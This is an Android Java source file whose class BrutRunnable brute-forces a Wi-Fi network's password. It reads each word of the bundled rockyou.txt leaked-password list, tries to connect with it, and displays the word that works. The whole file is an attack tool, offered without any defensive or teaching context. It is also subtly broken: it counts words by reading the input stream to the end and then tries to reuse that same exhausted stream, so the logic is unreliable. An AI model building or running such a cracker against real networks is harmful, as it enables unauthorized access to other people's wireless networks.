package com.example.wifitasksecondtime;

import android.app.ProgressDialog;
import android.content.DialogInterface;
import android.widget.TextView;
import java.io.IOException;
import java.io.InputStream;
import java.util.Scanner;

public class BrutRunnable implements Runnable {
    private DialogInterface dialogInterface_;

    private TextView password_;

    private ProgressDialog progressDialog_;

    private WiFiInfo wiFiInfo_;

    public BrutRunnable(ProgressDialog paramProgressDialog, WiFiInfo paramWiFiInfo, TextView paramTextView, DialogInterface paramDialogInterface) {
        this.progressDialog_ = paramProgressDialog;
        this.wiFiInfo_ = paramWiFiInfo;
        this.password_ = paramTextView;
        this.dialogInterface_ = paramDialogInterface;
    }

    private void Brut(InputStream paramInputStream) {
        Scanner scanner = new Scanner(paramInputStream);
        int i = 0;
        while (scanner.hasNextLine()) {
            String[] arrayOfString = scanner.nextLine().split(" ");
            for (int j = 0; j < arrayOfString.length; j++) {
                this.progressDialog_.setProgress(i);
                this.progressDialog_.setMessage(arrayOfString[j]);
                if (ConnectToWiFi.tryConnectWiFi(this.wiFiInfo_, arrayOfString[j])) {
                    this.password_.setText(arrayOfString[j]);
                    this.dialogInterface_.cancel();
                    return;
                }
                i++;
            }
        }
        scanner.close();
    }

    private int getCountWords(InputStream paramInputStream) {
        Scanner scanner = new Scanner(paramInputStream);
        int i;
        for (i = 0; scanner.hasNextLine(); i += (scanner.nextLine().split(" ")).length);
        scanner.close();
        return i;
    }

    public void run() {
        try {
            InputStream inputStream = MainActivity.getContext_().getApplicationContext().getAssets().open("rockyou.txt");
            this.progressDialog_.setMax(getCountWords(inputStream));
            Brut(inputStream);
            inputStream.close();
            return;
        } catch (IOException iOException) {
            throw new RuntimeException(iOException);
        }
    }
}
